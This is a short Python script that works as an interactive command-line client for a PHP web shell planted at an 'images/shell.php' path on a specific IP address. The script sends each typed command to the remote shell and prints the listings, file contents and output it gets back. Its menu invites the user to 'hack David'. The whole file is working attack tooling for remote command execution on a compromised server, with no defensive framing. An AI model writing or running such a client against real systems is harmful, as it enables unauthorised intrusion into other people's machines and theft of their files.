import httplib2
from lxml import etree, html


def hackHttp(cmd):
    h = httplib2.Http(".cache")
    (resp_headers, page) = h.request("http://100.66.52.24/images/shell.php?command=" + cmd, "GET")
    return resp_headers, page


def printls(cmd):
    cmd = str(cmd)[2:-1]
    cmdSplitted = cmd.split("\\n")
    for file in cmdSplitted:
        print(file)


def printHTML(file):
    document_root = html.fromstring(file)
    print(etree.tostring(document_root, encoding='unicode', pretty_print=True))


def prettyPrint(cmd):
    cmd = str(cmd)[2:-1]
    print(cmd)


def printMenu():
    print("Type a command to hack David or type 'QUIT' to quit")
    print("Finally type 'MENU' to see this again!")
    print("Enjoy hacking David!")
    print("")


if __name__ == '__main__':
    reply = "Oui"
    lastcmd = []
    printMenu()
    while reply != "QUIT":
        reply = input("~$ ")
        if reply == "QUIT":
            print("Gbye!")
        elif reply == "MENU":
            printMenu()
        else:
            if reply.__contains__("ls"):
                reply += " -l"

            headers, content = hackHttp(reply)

            if reply.__contains__("ls"):
                printls(content)
            elif reply.__contains__(".php"):
                if reply.__contains__("cat"):
                    try:
                        printHTML(content)
                    except Exception:
                        print(content)
            else:
                prettyPrint(content)
            lastcmd.append(reply)
        print("")
